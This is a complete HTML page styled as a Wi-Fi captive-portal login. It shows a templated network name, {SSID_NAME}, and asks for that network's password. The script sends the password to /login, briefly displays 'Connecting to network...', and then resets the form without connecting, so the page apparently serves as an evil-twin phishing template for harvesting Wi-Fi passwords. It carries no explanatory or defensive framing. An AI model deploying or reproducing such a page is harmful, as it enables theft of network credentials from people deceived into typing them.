<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Wi-Fi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#fff;border-radius:16px;box-shadow:0 2px 16px rgba(0,0,0,.1);
width:100%;max-width:380px;padding:32px 28px;text-align:center}
.icon{margin:0 auto 16px}
.icon svg{width:48px;height:48px;fill:#3b82f6}
h1{font-size:18px;font-weight:600;color:#1a1a2e;margin-bottom:4px}
.ssid{font-size:15px;color:#6b7280;margin-bottom:24px}
.field{position:relative;margin-bottom:20px;text-align:left}
.field label{display:block;font-size:13px;font-weight:500;color:#374151;margin-bottom:6px}
.field input{width:100%;padding:12px 44px 12px 14px;font-size:15px;border:1.5px solid #d1d5db;
border-radius:10px;outline:none;transition:border .2s}
.field input:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.15)}
.toggle{position:absolute;right:12px;top:34px;cursor:pointer;background:none;border:none;
padding:4px;color:#9ca3af}
.toggle svg{width:20px;height:20px;fill:currentColor}
.btn{width:100%;padding:13px;font-size:15px;font-weight:600;color:#fff;
background:#3b82f6;border:none;border-radius:10px;cursor:pointer;
transition:background .2s,transform .1s}
.btn:hover{background:#2563eb}
.btn:active{transform:scale(.98)}
.btn:disabled{background:#93c5fd;cursor:not-allowed;transform:none}
.spinner{display:none;margin:16px auto 0;width:28px;height:28px;
border:3px solid #e5e7eb;border-top-color:#3b82f6;border-radius:50%;
animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.msg{display:none;margin-top:14px;font-size:14px;color:#059669;font-weight:500}
.footer{margin-top:20px;font-size:11px;color:#9ca3af}
</style>
</head>
<body>
<div class="card">
<div class="icon">
<svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
</div>
<h1>Connect to Wi-Fi</h1>
<p class="ssid">{SSID_NAME}</p>
<form id="f" action="/login" method="POST">
<div class="field">
<label for="pw">Password</label>
<input id="pw" name="password" type="password" placeholder="Enter Wi-Fi password"
 autocomplete="off" required minlength="8">
<button type="button" class="toggle" onclick="togglePw()" aria-label="Show password">
<svg id="eye" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
</button>
</div>
<button type="submit" class="btn" id="sub">Connect</button>
</form>
<div class="spinner" id="sp"></div>
<p class="msg" id="msg">Connecting to network...</p>
<p class="footer">Secured connection &bull; Terms apply</p>
</div>
<script>
function togglePw(){var p=document.getElementById('pw');
p.type=p.type==='password'?'text':'password'}
document.getElementById('f').addEventListener('submit',function(e){
e.preventDefault();var pw=document.getElementById('pw').value;
if(pw.length<8)return;
var b=document.getElementById('sub');b.disabled=true;b.textContent='Connecting...';
document.getElementById('sp').style.display='block';
fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
body:'password='+encodeURIComponent(pw)}).then(function(){
document.getElementById('sp').style.display='none';
document.getElementById('msg').style.display='block';
setTimeout(function(){b.disabled=false;b.textContent='Connect';
document.getElementById('msg').style.display='none'},10000)
}).catch(function(){b.disabled=false;b.textContent='Connect';
document.getElementById('sp').style.display='none'})})
</script>
</body>
</html>
